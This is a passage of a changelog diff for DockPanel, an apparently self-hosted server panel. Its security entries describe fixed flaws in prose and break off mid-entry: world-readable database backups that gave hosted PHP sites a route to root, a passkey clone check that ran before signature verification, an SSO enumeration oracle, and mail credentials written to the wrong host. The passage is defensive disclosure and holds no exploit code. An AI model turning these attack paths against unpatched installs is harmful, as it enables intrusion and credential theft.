+### Fixed — restoring a volume backup could not work, and fixing it alone was unsafe
+
+`POST /api/backup-orchestrator/volume-backups/{id}/restore` has never once
+succeeded. The panel sent no request body, and the agent's handler requires one,
+so the request was rejected with `415 Unsupported Media Type` before any handler
+code ran. The endpoint is published in the API reference and the backup guide,
+so the only signal an operator got was a failure at the moment they needed a
+restore. The volume *drill* could not reveal this either: it re-implements the
+restore rather than calling this path, so a passing drill said nothing about it.
+
+The body is now sent. That fix is shipped **together** with an ownership scope,
+deliberately: the backup row was fetched by id alone, and the agent is chosen
+from the row's own server, so repairing the body by itself would have turned a
+route that always failed closed into one where an administrator could unpack a
+backup over a live volume on a server somebody else registered. The row is now
+scoped to servers the caller operates — this machine, or one they added — with
+the role read from the database rather than from the token.
+
+### Fixed — the webhook rate limiter reset four times an hour
+
+Both webhook endpoints limit failed secret attempts to ten per hour, and both
+roll their own one-hour window. The periodic cleanup task evicted their counters
+on a **five-minute** window — the one belonging to the two-factor limiter, whose
+handler genuinely uses five minutes — so a counter was discarded at the next
+sweep and the allowance started again roughly every quarter of an hour.
+
+The counters are now retained for the hour their handlers promise. Because these
+entries are created by an unauthenticated route, keyed on a deploy id supplied by
+the caller, the longer retention is paired with a cap that sheds the entries a
+flood of invented ids would leave behind. The limit itself is now defined once
+and read by all three call sites, which is what stopped them agreeing before.
+
+No practical exposure: the two endpoints' secrets carry 256 and 122 bits of
+randomness respectively, so the limiter is defence in depth rather than the thing
+standing between a caller and a secret.
+
+## [2.88.0] - 2026-08-08
+
+### Fixed — a hosted site could read the panel's database backup
+
+`/var/backups/dockpanel` was created world-traversable and every writer used a
+plain shell redirect or an unmoded write, so the dumps landed `0644`. Both panel
+services run as root and neither ever needed those bits — but on a panel host
+that also serves websites, `www-data` is the uid **every** hosted site's PHP runs
+as. Measured on our own demo box before the fix: **17 of 17 files readable as
+`www-data`**, the newest a complete `pg_dump` of the panel database.
+
+That dump contains `users`, `user_sessions`, `api_keys` and — in cleartext —
+`servers.agent_token`. That token is the Bearer credential for every
+authenticated agent endpoint *and* the key the agent verifies its own root-shell
+tickets with. So a single PHP file dropped on any site the panel hosts was a
+path to root on the panel host and on every server it manages.
+
+All four writers now create these files root-only: the agent's own
+`/security/db-backup`, the panel's automatic backup, the daily cron `setup.sh`
+installs, and the pre-upgrade dump in `update.sh`. **Fixing the writers is not
+enough on a box that already has backups**, so the agent also re-secures the
+whole tree at every start — `0700` on directories, `0600` on files, never
+following a symlink out of it. Upgrading repairs an install that has been
+exposed since its first backup.
+
+### Fixed — the terminal reported intruders only if they used the browser
+
+Terminal input was reconstructed and judged inside the `{"type":"input"}`
+WebSocket envelope the panel's own UI sends. Input that arrived as a plain text
+frame reached the shell unexamined: no `terminal.suspicious_command` event, and
+on a **root** shell no bookkeeping at all. Since the panel's terminal page sends
+the JSON envelope at every one of its senders, the one input path with no
+detection was the one only a *scripted* client takes — which is exactly the
+client someone with a stolen admin session uses. Measured before the fix, same
+account and same command: JSON frame → one event recorded; raw frame → none.
+
+There is now one path that every byte reaching the shell passes through,
+whichever frame shape carried it, and it observes root shells as well as site
+shells. **Refusals are reported too**: a command the site blocklist turned away
+used to produce a line in the agent's own journal and nothing else — the
+strongest signal the product can observe was the one nobody could see. It is now
+in the security audit log.
+
+Deliberately, a refusal does **not** count toward the auto-lockdown threshold.
+The site blocklist is intentionally blunt (it refuses any command containing
+`..`, which catches `echo "done..."`), so counting accidental refusals would let
+an ordinary tenant lock every non-admin out of the panel for 24 hours.
+
+**Honest bound:** the command line is reconstructed from keystrokes, so anything
+that moves the cursor still makes what is observed differ from what the shell
+runs. This release removes the dependence on the client's choice of frame shape;
+it does not make the reconstruction unevadable, and nothing here should be read
+as claiming otherwise.
+
+### Fixed — root terminals ran with a broken environment
+
+The child process set `HOME`, `USER` and `PATH` with `putenv`, which stores the
+pointer it is given rather than copying it. Every one of those strings was freed
+before the shell was executed, and the memory was reused in between. All 17
+session recordings on our demo box open with the prompt that means `HOME` is
+unset. A `--login` shell therefore never read root's own profile, and a bare
+`cd` failed. The environment is now set with `setenv`, which copies.
+
+The same routine dropped privileges for a site terminal without checking whether
+the drop succeeded. A failed `setuid` — which the kernel can return when the
+target user is at its process limit, and `www-data` also runs every PHP worker —
+would have continued into the shell as root. All three calls are now checked,
+and the child re-reads its own uid from the kernel before executing anything.
+
+### Fixed — the SSH key list said "none" without looking
+
+The panel's list of who can log in as root over SSH read
+`/root/.ssh/authorized_keys` from inside the agent's sandbox, which makes `/root`
+an inaccessible directory. The error was discarded, so the endpoint answered
+**200 with an empty list** — on a box with three live keys. Adding or removing a
+key returned 500. This has been true on every install since the feature shipped,
+one day after the sandbox setting that breaks it.
+
+Reads and writes now run outside the sandbox, and an unreadable file is an error
+rather than an empty list — "no keys" means the agent looked and found none. The
+removal path was repaired in the same change: it also treated a failed read as
+an empty file, and would have rewritten `authorized_keys` with nothing in it, so
+repairing only the sandbox would have turned a dead feature into a destructive
+one on the first transient error.
+
+### Tests
+
+New `agent-security-signals-pin-e2e.sh` (18 assertions), 20 of which are red at
+v2.87.0. Nine new unit tests. `terminal-scope-signed-pin-e2e.sh` gains an arm:
+its existing check that "a site shell still drops privilege" was satisfied by two
+tokens that merely coexist, and would have passed on a tree where the drop
+silently fails.
+
+## [2.87.0] - 2026-08-08
+
+### Fixed — a 401 now says which of two different things it means
+
+Every error the panel returns with a 401 was replaced, in the browser, by the
+single word "Unauthorized" — and the user was logged out. The response body was
+never read. On the login form of every install, mistyping your password reported
+"Unauthorized" rather than "Invalid credentials", and on the account card,
+mistyping your password or your 2FA code logged you out of the page you were
+standing on with no message at all.
+
+A 401 means one of two unrelated things: *your session is gone*, or *the
+credential you just typed was wrong*. The client could not tell them apart, so
+it assumed the worst about all of them. The rule it now follows is structural
+rather than a matter of taste: **if a handler returned 401, the session was
+valid**, because the authentication extractor had already let the request
+through. Session death is therefore minted in exactly one place and carries a
+marker, and only that marker sends anyone back to the login page.
+
+Sentences that had never reached a user before this release include "Current
+password is incorrect", "Invalid credentials", and "Two-factor authentication is
+no longer set up on this account. Sign in again." — the last of which exists
+precisely to tell an administrator whose 2FA was reset by a colleague what to do
+next, and which arrived as "Unauthorized".
+
+**The public status page was closed to the public.** The server-list provider
+mounts above the router, so it runs on every route including `/status`, took a
+401 there and navigated the visitor to a login form before the page could
+render. Anyone following a status-page link during an outage — the one moment
+the page exists for — reached a login form instead. `/status` is now a public
+path, which is what the set it was missing from already claimed to contain.
+
+**A login attempt against an account that signs in with an identity provider
+returned 500.** Those accounts have no stored password, and the empty string is
+not a valid hash, so parsing it failed. A non-existent address answered 401 and a
+password account answered 401; the one class that answered anything else was
+"this address exists and uses SSO" — an enumeration oracle at an unauthenticated
+door. It was also returned above the two lines that record the attempt, so the
+probe was neither counted against the rate limit nor written to the log
+`GET /api/security/login-audit` reads: unthrottled and invisible. Having no
+password is now answered exactly like presenting the wrong one, and at the same
+cost — the dummy verification still runs, or the status oracle would simply have
+become a timing oracle.
+
+Two smaller repairs of the same shape, where a sentence written for a user was
+discarded by the layer in front of them: the status page's subscribe button
+reported "Subscribed!" for a refusal it never checked for, so a visitor could
+subscribe to outage notices that would never arrive and no operator would hear
+about it; and the two halves of the passkey login ceremony disagreed, the first
+discarding the server's explanation and printing a fixed string where the second
+showed it.
+
+**Honest bound, stated rather than hidden:** the redirect now depends on a marker
+the backend sends. A client paired with an older backend — in practice only a
+`scripts/update.sh` rollback, which restores the three binaries and keeps the
+newer frontend — will show the message instead of bouncing a genuinely dead
+session. Nothing is exposed by that; the session is dead server-side and every
+request still fails. Any full page load re-checks the session and lands the user
+at the login form.
+
+New regression suite `auth-401-meaning-pin-e2e.sh` (20 assertions, every
+non-context arm red at v2.86.0) plus 9 unit tests, including an executed proof
+that an empty password hash cannot be parsed — the mechanism behind the 500.
+
+## [2.86.0] - 2026-08-08
+
+### Security — the passkey ceremony's own checks now mean what they say
+
+v2.85.0 guarded the door that *plants* a passkey. This release audits what the
+two ceremonies actually verify once a credential exists, and fixes four places
+where a check was present but arranged so that it could not do its job.
+
+**The clone check ran before the signature was verified.** DockPanel has
+detected cloned authenticators since passkeys shipped: an assertion whose
+signature counter has not advanced is refused with "Credential may be cloned".
+But that test ran *twenty lines above* the signature verification, and WebAuthn
+puts it after for a concrete reason. Everything needed to reach it was public —
+the challenge endpoint is unauthenticated, the RP ID hash is a SHA-256 of a name
+in the URL bar, the user-present bit is a constant — so the one refusal in the
+file that says "clone" fired on forged authenticator data carrying a garbage
+signature. It also returned without recording a login attempt, unlike every
+other credential refusal beside it, which made it a free retry. The check now
+runs after the signature, where reaching it costs the attacker the private key,
+and a detected clone both counts against the rate limit and writes a row to the
+security audit log. That ordering is why the detector had stayed silent: an
+alert wired to a branch a stranger can trigger is a fabricated-alert writer, so
+the reorder had to come first and the alert second.
+
+**A live counter presented with zero was exempt.** The rule tested that *both*
+the stored and the presented counter were non-zero before comparing them, where
+the specification applies the comparison when *either* is. That exempted the
+cheapest forgery available — send zero, match nothing — and an accepted
+assertion then wrote the zero back. Authenticators that genuinely have no
+counter, which includes most synced passkeys, report zero on both sides and are
+still correctly never flagged. The counter write is now also conditional, so two
+assertions in flight cannot let the lower one land last and rewind the stored
+value into the state the check exists to notice.
+
+**A 32-byte payload crashed the registration handler.** Authenticator data is a
+32-byte hash, one byte of flags and a four-byte counter. The registration door
+required 32 bytes and then read the flags byte at offset 32, so a buffer of
+exactly the hash passed the guard and indexed out of bounds. The login door had
+always required the full 37; the asymmetry between the two doors was the bug.
+Reachable only by the account owner, and it dropped a single connection rather
+than the process, but it is gone.
+
+**The login door now checks which ceremony issued its challenge.** The
+registration door has always rejected a challenge minted for the other ceremony;
+the login door accepted whatever the store held. No attack is known through it —
+that door identifies the account from the credential, never from the challenge's
+own binding — and it is fixed for symmetry, so a third ceremony added later is
+not accepted by default.
+
+### Tests — the ceremony had none at all
+
+`passkeys.rs` carried no unit tests and no regression-pin assertion of any kind:
+origin, RP ID hash, user presence, the counter and the signature were five live
+checks with zero coverage anywhere in the repository. This release adds 16 unit
+tests over the parts that are pure functions — the counter rule's full truth
+table, the authenticator-data length ladder including the byte count that used
+to panic, and the COSE key parser's rejection paths — plus
+`passkey-ceremony-pin-e2e.sh`, 21 assertions covering the arrangement facts a
+unit test cannot reach, such as the order of the counter check relative to the
+signature.
+
+A regression pin in `suspend-restore-pin-e2e.sh` was also repaired. It asserted
+that a suspended account is refused at every door, counting matches in one file
+against a threshold that file met exactly — so it sat at its own floor, and the
+passkey door, which mints a session without touching that file, was invisible to
+it. It is now a membership test over all four surfaces that can mint a session.
+
+### Dependencies
+
+`nanoid` 3.3.16 → 3.3.18 in both the panel and the marketing site, closing a
+high-severity advisory, and `dompurify` 3.4.12 → 3.4.13 in the panel, closing a
+moderate cross-site-scripting one. **Neither was exploitable in DockPanel.**
+`nanoid` is never imported by this project — it arrives under PostCSS inside
+Vite and runs only at build time — and the DOMPurify issue requires a removed
+`IN_PLACE` hook, where DockPanel registers no hooks at all and calls
+`sanitize()` directly. Patched because a dependency that has a fix should carry
+it, not because anything here was at risk.
+
+### Not fixed, deliberately
+
+User verification is still not required. A passkey remains proof of possession
+only, while passkey sign-in deliberately skips the 2FA step. This is not a
+one-line change: user verification is a property of each ceremony rather than of
+the credential, so requiring it at enrolment protects nothing, and requiring it
+at sign-in is retroactive — every already-enrolled credential on a security key
+without a PIN would stop working, with nothing recorded at registration to
+grandfather from. It needs a column, a migration and a way to prove the change
+end to end. The pin suite records the gap so it is not mistaken for an oversight.
+
+## [2.85.0] - 2026-08-07
+
+### Security — adding a passkey now requires you to confirm who you are
+
+A passkey is the only credential DockPanel mints that survives every reset it
+offers. Clearing a user's 2FA, resetting their password and signing out all of
+their sessions all leave an enrolled passkey working, and passkey sign-in
+deliberately does not take the 2FA step. Enrolment, meanwhile, required nothing
+but a session. So anyone who reached an open session — a shared machine, a
+stolen cookie, a script on the page — could enrol their own passkey and convert
+that moment into permanent, 2FA-free access that no administrator action could
+revoke. Deleting the account was the only remedy.
+
+`POST /api/auth/passkey/register/begin` now requires proof: the current
+password, a code from the authenticator, or a recovery code. **Any one of them
+is enough, deliberately.** An administrator who has lost their authenticator
+still knows their password, and the security-hardening guide tells exactly that
+person to register a passkey as their way back — a door that demanded a TOTP
+code would refuse them at the moment they need it, which is the same correction
+`2fa/disable` already had to be given in v2.83.0.
+
+An account that signs in only through an identity provider has no password by
+construction and may hold no authenticator. Rather than barring it from passkeys
+permanently, it falls back to session freshness: it is asked to sign in again
+with its provider if its session is more than five minutes old. This is a weaker
+check than a credential and is documented as such — it bounds a session replayed
+from another machine, not a script running on the panel's own origin.
+
+The refusal is a **403 with a `reauth_required` code**, never a 401: the frontend
+intercepts every 401 globally and navigates to `/login` before the body is read,
+so a 401 here would have logged people out of the page they were standing on the
+first time they mistyped a password.
+
+Two supporting changes: a new passkey now raises a notification **to the account
+that owns it**, and passkeys appear in **Export my data** — the panel was
+exporting the credential class that can be revoked while omitting the one that
+cannot.
+
+⚠ **Accepted cost, named rather than discovered:** the enrolment door reuses the
+2FA attempt limiter, which is keyed on user id alone. Five wrong passwords here
+also lock that user out of `/auth/2fa/disable` and `/auth/2fa/recovery-codes`
+for five minutes.
+
+### Not changed, deliberately
+
+`DELETE /api/auth/passkeys/{id}` still deletes unconditionally. A "last remaining
+factor" guard was considered and rejected: the attack adds a credential and never
+removes one, the route needs a live session so lost hardware cannot reach it, and
+no account can reach zero doors by deleting a passkey. Refusing would only take
+the recovery path away from the people most likely to need it. The Remove button
+did gain a confirmation step.
+
+### Security — the react-router advisory waiver has been retired
+
+`GHSA-qwww-vcr4-c8h2` was waived on the written grounds that it needs the React
+Router server runtime (which neither frontend ships) and that the only fix
+available was a downgrade out of the 7.x line. The waiver ended with "re-check
+when react-router ships a fix inside the ^7 range", and the daily live-surfaces
+check was given that job rather than being trusted to remember it. It fired:
+7.18.2 carries the fix, inside a range both frontends already allowed.
+
+Both are on 7.18.2 and the waiver is gone, leaving nothing currently excused. The
+two checks that existed to police the waiver were re-pointed rather than deleted
+— they now assert that the advisory is *not* waived and that the version actually
+locked is at or above the fix, because the argument that used to protect us has
+been replaced by a version number, and a version number can be lost to a lockfile
+churn nobody reads.
+
+## [2.84.0] - 2026-08-07
+
+### Security — every door that checks a 2FA code is now rate-limited
+
+Signing in with two-factor enabled was limited to five attempts per five minutes,
+because a six-digit code is guessable. Turning two-factor **off** was not limited
+at all — and it checks the same six-digit code, against the same secret, to make
+the change that removes the factor. The check runs with a one-step tolerance, so
+three codes in a million are live at any instant, and nothing sat above the
+handler either: the panel installs no rate-limiting middleware, and the `/api/`
+block written for the panel's own vhost carries no request limit.
+
+Anyone holding a hijacked session could therefore strip two-factor authentication
+off the account by guessing at it — which is precisely what the code prompt on
+that screen exists to prevent. v2.83.0 widened this by also accepting recovery
+codes there, and moving the screen to **My Account** put it in front of every
+role. The limiter has been lifted out of the login handler into one place and
+applied to all three doors that treat a 2FA code as a credential.
+
+### Added — an administrator can reset a user's two-factor authentication
+
+Until now the only statement in the panel that could clear a two-factor
+enrolment lived behind a code prompt, so an account that had lost its
+authenticator could only be repaired by someone who could still produce a code.
+For accounts enrolled before v2.83.0 there was no such person: they hold ten
+recovery codes that were generated, stored, and **never displayed**, because the
+block that draws them sat inside a branch the enable handler cleared in the same
+breath. Both factors were gone at once, and the only route back was editing the
+database by hand.
+
+**Users** now offers *Reset 2FA* on rows that have an enrolment. It erases the
+enrolment and any remaining recovery codes, signs out every session that user
+holds, and is recorded in the activity log as `user.reset_2fa`.
+
+It deliberately refuses to act on your own account — doing so would remove the
+factor with no code presented at all. Two limits are documented rather than
+papered over: an administrator who has lost their own authenticator needs a
+second administrator, and a **sole** administrator who has lost both their
+authenticator and their recovery codes still cannot be recovered through the
+panel. Registering a passkey, or keeping a second administrator, prevents that.
+
+### Added — recovery codes can be reissued, and the remaining count is shown
+
+Recovery codes were written once at enrolment and consumed one per use, with no
+way to mint more short of disabling two-factor entirely. After ten recovery
+logins the fallback was silently gone, and nothing ever reported how many were
+left.
+
+**My Account** now shows how many remain, says so plainly when the answer is
+none, and offers *New recovery codes* — confirmed with an authenticator code or
+one of the remaining recovery codes. This is the repair for every account that
+enrolled before v2.83.0: while you still have your authenticator, one click
+replaces a set you were never shown with one you can read.
+
+### Security — recovery codes are twice as wide
+
+Recovery codes were four random bytes — **32 bits** — stored as an unsalted
+SHA-256, which is a fast hash. A 32-bit space under a fast hash is exhaustible on
+ordinary hardware in seconds, so anyone holding a copy of the `users` table or an
+old backup could recover the plaintext codes. That is the situation two-factor
+authentication exists to survive: the recovery code is supposed to still mean
+something after a password hash has leaked. Since v2.83.0 a recovery code also
+*disables* 2FA, which raised what a recovered code is worth.
+
+New codes are eight bytes — 64 bits — and the field that accepts them takes both
+widths, so codes already issued keep working. Reissuing a set replaces short codes
+with long ones. The hash is deliberately unchanged: matching is by hash, and a
+migration cannot re-hash values it cannot read, so width is the lever that works
+without invalidating anybody's existing set.
+
+### Fixed — documentation that described protections the code does not apply
+
+The security guide stated that recovery codes are stored as Argon2 hashes. They
+are stored as SHA-256 hashes; the guide now says so, and distinguishes them from
+passwords, which are Argon2 with a per-user salt. It also claimed that enabling
+*Enforce 2FA* prompts users to set it up at their next login — no such prompt
+exists. The setting warns and does not refuse, for reasons the guide now gives.
+
+Finishing the second step of a login after an administrator reset that account's
+two-factor authentication returned a server error; it now says the enrolment is
+gone and to sign in again.
+
+## [2.83.0] - 2026-08-07
+
+### Added — an account of any role can reach its own security settings
+
+Two-factor enrolment, passkeys, password change, active sessions, API keys and
+the personal data export all lived on the Settings page, whose navigation entry
+is administrator-only. Every account that was not an administrator — `user`,
+`client`, `reseller` — therefore had no entrance to any of them.
+
+None of this was a permissions problem. Every endpoint behind those screens was
+already authenticated-user-scoped and already restricted to the caller's own
+rows; the capability had shipped long ago with no way in. A new **My Account**
+page carries all six, visible to every role, and the Settings tab now renders the
+same components rather than a second copy of them.
+
+The one thing a non-administrator could already do was reset a password through
+the public *Forgot password* form, which requires working SMTP and being logged
+out. Everything else was unreachable.
+
+### Fixed — a lost authenticator was a dead end
+
+Recovery codes let you log in and nothing else. Turning two-factor off accepted
+only a live code from the authenticator app, so an account whose device was lost
+could sign in with a recovery code and then never disable, re-enrol, or repair
+itself — and the panel has no administrator-side two-factor reset either. The
+browser form made it unreachable a second way, discarding every non-digit and
+demanding exactly six characters, while a recovery code is eight characters of
+hex and could not be typed into the field at all.
+
+Disabling now accepts a current authenticator code **or** a recovery code, using
+the same check the login screen already performed, and the field admits both.
+This mattered more after the change above: the button that refuses is now on
+every account's own page rather than in an administrator-only corner.
+
+### Fixed — enrolling in two-factor never showed the recovery codes
+
+The codes were rendered inside the branch that draws the QR screen, and the
+handler that receives them leaves that branch in the same breath — it sets the
+account to enabled and clears the setup state, so the condition was false by the
+time there was anything to show. The success message read "2FA enabled! Save your
+recovery codes." and no codes were ever drawn. Every account that enrolled has
+none, which matters more now that a recovery code is also what turns two-factor
+off. They are now shown after enrolling; an account that enrolled earlier can
+disable and re-enrol to receive a set.
+
+### Fixed — the two-factor banner pointed at a page the warned account cannot open
+
+All four layouts told a non-administrator "Two-factor authentication is required"
+and offered a **Set Up 2FA** button linking to Settings — the one page their
+navigation does not carry. The banner now links to My Account. Three of the four
+buttons were also plain anchors, so following one reloaded the whole application
+instead of navigating.
+
+### Fixed — controls that only an administrator can use were shown to everyone
+
+Inside the account tab, "Require 2FA for all users" and "Revoke every session,
+panel-wide" each asserted they were administrator-only — one in a source comment,
+one in its own on-screen text — with nothing enforcing it. Both call
+administrator-only endpoints and so always refused, which is why neither leaked
+anything and why both survived; a control that refuses is a broken promise rather
+than a disclosure. Both are now behind the role check their text claimed.
+
+The Notifications page, which every role can open, linked everyone to Settings to
+configure alert channels. Alert rules are per-user data, but the screen that edits
+them has not moved yet, so the link is shown only to administrators rather than
+continuing to offer a door that answers with a refusal.
+
+## [2.82.0] - 2026-08-07
+
+### Fixed — deleting an administrator could delete every site on the server
+
+A server belongs to whoever registered it: the local machine to the first
+administrator created, and each fleet member to the administrator who added it.
+That ownership is a foreign key with `ON DELETE CASCADE`, and every site carries
+a foreign key to its server with `ON DELETE CASCADE` as well. The two compose.
+Deleting the account therefore removed the server row, and the server row took
+**every site on that machine with it** — every owner's sites, not only the
+deleted account's — along with their backups, schedules, databases, cron jobs and
+deploy history. The panel reported success. The files and vhosts kept serving from
+disk, so nothing appeared wrong until someone opened the panel and found the
+inventory gone.
+
+Retiring the founding administrator after appointing a successor is the ordinary
+reason to open that screen, so this was reachable by the intended use of the
+feature. Deleting a user now hands their machines to the administrator performing
+the deletion, inside one transaction, and reports which machines moved — in the
+response and in the activity log. Refusing the delete instead would have been
+safe for the data and would have made such an account permanently undeletable,
+since nothing in the panel can re-assign a server.
+
+### Fixed — a panel's second administrator could not see any servers
+
+The server list was scoped to the caller's own rows for every role, so an
+administrator who had not personally registered a machine was shown "No servers
+found. The local server should appear automatically." It never could. An
+administrator now sees every machine; everyone else continues to see only what
+they hold. Seven related reads — the drift checks and the fleet aggregations on
+the dashboard — still resolve machines by owner and are unchanged for now; the
+limitation is recorded in the source.
+
+### Security — transferring a site left its staging environment behind
+
+A staging environment is a second site row pointing at its parent. Transfer moved
+only the parent, so the previous owner kept the staging clone: it stayed in their
+site list, they kept a shell inside a full copy of the new owner's document root —
+including any configuration file holding database credentials — and they kept the
+push-to-production control, which writes that copy over the new owner's live site.
+Transfer now moves a site together with its staging children, and the dependent
+rows follow the sites that actually moved.
+
+### Security — the site terminal's cross-site guard missed the relative path
+
+The guard that stops a site shell reading another site's files matched only the
+absolute path, while the shell's own working directory sits inside the directory
+being protected — so the relative spelling walked straight past it. Both spellings
+are now refused. The guard's real scope is documented in the source alongside it:
+all sites run as the same system user, so this is a barrier against the obvious
+mistake, not an isolation boundary. A real boundary needs a per-site user or a
+namespace, and is a separate change.
+
+### Fixed — the panel refused people their own certificates and maintenance windows
+
+Four endpoints required an administrator over queries that were already limited to
+the caller's own rows, so the check never decided what was returned — only who was
+turned away. The visible result was a dashboard tile reporting a site owner's SSL
+certificates and expiry dates, linking to a page that answered "Admin access
+required" over "No SSL certificates found". Site owners now see their own
+certificates and can schedule maintenance windows for their own alerts.
+
+### Fixed — a reseller could not manage accounts its own panel listed
+
+The reseller's user table listed every account beneath them, while the actions on
+those accounts required the account to still hold the default role. An account
+moved to the client role — the flow the roles guide prescribes — or suspended by
+an administrator stayed on screen with its site count and answered "User not
+found" to Reset Password and to Delete. Resellers can now act on the accounts they
+are shown; administrators and other resellers remain out of reach by an explicit
+allow-list.
+
+### Fixed — the panel told non-administrators it was broken, on every page
+
+The sidebar health indicator polled an administrator-only endpoint and rendered the
+refusal as a failure, so every non-administrator saw a pulsing red "Disconnected" /
+"Issues Detected" from the moment they signed in. The indicator is now shown only
+to the administrators it describes something for.
+
+### Fixed — "Require 2FA for all users" was never shown to the users it applied to
+
+The banner warning that two-factor authentication is mandatory read the setting
+from an administrator-only endpoint and discarded the refusal, so it could only
+ever appear for administrators — the one group that did not need telling. The flag
+now rides on the per-user 2FA status endpoint. Enrolment still lives on a page
+non-administrators cannot reach, so the panel tells them rather than blocking the
+login; blocking before there is a door would lock people out with no way back.
+
+### Fixed — clients were offered the one action their role forbids
+
+An account with the client role holds sites and cannot bring a new domain into
+service. The panel still offered Create Site, Clone, Create Staging and Add Alias,
+so the refusal arrived only after filling in a domain, a runtime, a PHP version
+and — for a WordPress site — an administrator username and password. Those controls
+are now hidden for that role, and the empty sites list explains that sites are
+handed over by an administrator instead of inviting the person to create one.
+
+## [2.81.0] - 2026-08-07
+
+### Fixed — resetting a MariaDB database password has never worked
+
+The MariaDB branch of the agent's password reset connected as the container's
+root account with no credential, on the stated premise that root can
+authenticate over the unix socket inside the container. That premise was never
+true of a container DockPanel itself creates: the database container is started
+with a random root password, which gives `root@localhost` a random
+`mysql_native_password` and does not enable socket authentication. Every reset
+therefore failed with `ERROR 1045 … Access denied for user 'root'@'localhost'`
+and surfaced as a 500. Measured on `mariadb:11` with exactly the environment
+DockPanel sets; the PostgreSQL branch was unaffected.
+
+The reset now authenticates **as the tenant** using the current password the
+panel already sends, and asks the server to change its own account — the same
+connection shape the SQL console has used in production all along. Two
+consequences: the feature works, and the `old_password` in the request is now
+load-bearing rather than transmitted and discarded. A rejected login is reported
+as what it is — the panel's stored credential and the database's real one have
+diverged — instead of a bare "access denied".
+
+### Security — a WordPress auto-update toggle could erase root's entire crontab
+
+`crontab` has no partial-update verb, so every writer reads the whole file and
+writes the whole file back. `set_auto_update` read it with
+`.output().await.map(|o| …stdout…).unwrap_or_default()`, which turns **both** a
+spawn failure and a non-zero exit into an empty string, then piped that back as
+root's complete new crontab. A single transient failure would have deleted every
+scheduled job on the box — every tenant's, and every system entry — leaving at
+most one WordPress line. Reachable from an ordinary authenticated request naming
+a single site.
+
+The cron routes had already grown a fail-closed reader for exactly this reason,
+and its doc comment said so. It was a private helper, so the WordPress twin
+never got it. There is now one shared reader and one shared writer.
+
+### Fixed — uploading a certificate stripped a site's security config, and 502'd PHP sites
+
+The agent's SSL routes receive `{domain, certificate, private_key}` and have to
+invent the rest of the vhost, so they render one with WAF off, bot protection
+off, no CSP or Permissions-Policy, no custom nginx, default rate limits — and,
+because they cannot know the site's PHP version, an unversioned `php-fpm.sock`
+that exists on no modern Debian or Ubuntu. v2.18.0 added a compensating full
+re-render for provision, renew and force-renew. Certificate **upload** is the
+fourth sibling and never got it, so uploading a custom certificate silently
+disarmed a hardened site — with the panel's own toggles still reading ON, since
+the database row is untouched — and took a PHP site off the air outright.
+
+### Fixed — the backup taken before deleting a site had never captured a byte
+
+The pre-delete snapshot ran **after** the call whose agent handler removes the
+site's webroot, and `create_backup` refuses when the site root is missing. So it
+returned an error every single time, and `let _ =` discarded it. It now runs
+before anything destructive, includes the site's databases (which are still
+alive at that point), and logs a failure instead of swallowing it.
+
+### Fixed — a regression census could be satisfied by the next function's name
+
+The wrong-host census carved function bodies with a window that ended at the
+**successor's** position rather than at its declaration, so every body carried
+the next function's `fn name(` line. Membership and compliance are both tested
+against alternations of function names, so a handler inherited both from
+whatever happened to be declared below it: the census reported 48 members where
+there are 31, and two handlers were marked compliant on their neighbour's
+resolver. Fixed in all three censuses that share the idiom. Handlers that
+receive an already-resolved agent handle are now excluded explicitly, anchored
+to the signature so a route handler cannot claim the exemption.
+
+`databases.rs` is guarded by a new arm: it dispatches on container names rather
+than domains, so it contributed nothing to that census — the module holding both
+this release's fix and the previous one's was covered by no arm at all.
+
+### Added
+
+- `db-credential-auth-pin-e2e.sh` (15 assertions) and
+  `sibling-parity-pin-e2e.sh` (13) — every arm mutation-tested by planting the
+  defect and confirming the suite's summary line and exit code both go non-zero.
+
+
+## [2.80.0] - 2026-08-07
+
+### Security — an unattended loop let certificates expire on every fleet member
+
+`auto_renew_ssl` selected every site in the installation and renewed through the
+**panel's own agent**. On a single box those are the same machine, which is why
+this survived; on a fleet the panel was asked to renew a certificate for a domain
+it does not serve, HTTP-01 could not validate, and the certificate simply expired
+on a live customer site — unattended, on a 120-second tick, needing no attacker.
+The inverse was worse: where the local box could satisfy the challenge, the
+renewal succeeded and wrote the LOCAL certificate's expiry onto the remote site's
+row, pushing it out of the 45-day window so the loop stopped trying. A guaranteed
+outage behind a green panel.
+
+`auto_sleep_idle_containers` was the same shape: it asked the local nginx how
+recently a member's domain was served (always "unknown", so real traffic never
+counted), listed the local host's containers, and posted the stop locally.
+Auto-sleep was quietly inoperative for every fleet member.
+
+Both now resolve per row, and the auto-healer no longer receives a local-agent
+handle at all — the parameter is gone, so it cannot be reached for again.
+
+### Security — mail configuration was written to one host, for the whole fleet
+
+`sync_mail_config` ran three SELECTs with **no WHERE clause of any kind** and
+posted the result to whichever host the caller's `X-Server-Id` header named. Every
+mail domain, every mailbox's `password_hash` and `forward_to`, and every alias in
+the installation were written into one host's Postfix and Dovecot maps: a
+credential disclosure onto a machine that should never hold them, plus a
+mail-interception primitive, since that host would then accept mail for — and
+authenticate mailboxes of — domains it does not host.
+
+There was also **no caller predicate on mail at all**. `mail_domains` has no
+`user_id` column, so the scope extractor's check on a request header was the
+entire boundary between one administrator and another administrator's server.
+Removing the extractor without adding a predicate would have widened access, so
+both landed together as `MAIL_DOMAIN_CALLER_PREDICATE`.
+
+`create_domain` never bound `server_id`, so every mail domain created through the
+panel since the multi-server migration carried a NULL host. Because `/mail/sync`
+**rebuilds** the maps rather than merging them, filtering by server without
+repairing those rows would have deleted mailboxes from the host actually serving
+them. A migration backfills them (matching against `sites.domain` first, so a
+domain provisioned onto a member returns to the right host), and the rebuild
+refuses outright while any NULL row remains.
+
+`create_alias` never checked that the address belongs to the domain it is filed
+under. Postfix applies a virtual alias by address, so an alias filed under a
+domain you may write to could redirect mail for a different domain on the same
+host — the row said one thing and the map did another, and the map is what runs.
+
+### Security — a panic button that swept one machine
+
+The emergency lockdown wrote panel-global state — `lockdown_state`,
+`sessions_revoked_at`, registration, every terminal share — but killed terminals
+on a **single caller-selected agent**, then reported `terminals_killed` and
+`lockdown_active: true`. On a fleet it left live root shells on every other
+member while reading as complete. It now fans out, and names the hosts it could
+not sweep; an unreachable member during a panic is the loudest thing on the page.
+
+`lockdown_state.terminals_disabled` was **write-only** — set by `activate_lockdown`
+and read by nothing, anywhere. After a panic, an admin who signed back in could
+immediately open a fresh root terminal on any host while lockdown was active. The
+ticket mint, terminal sharing and shared-output views now honour it. (Revoking and
+listing shares deliberately stay open: they are the remedy, not the risk.)
+
+### Security — the wrong-host dispatch family, finished
+
+`v2.79.0` fixed 71 handlers that resolved a resource from its row and then acted
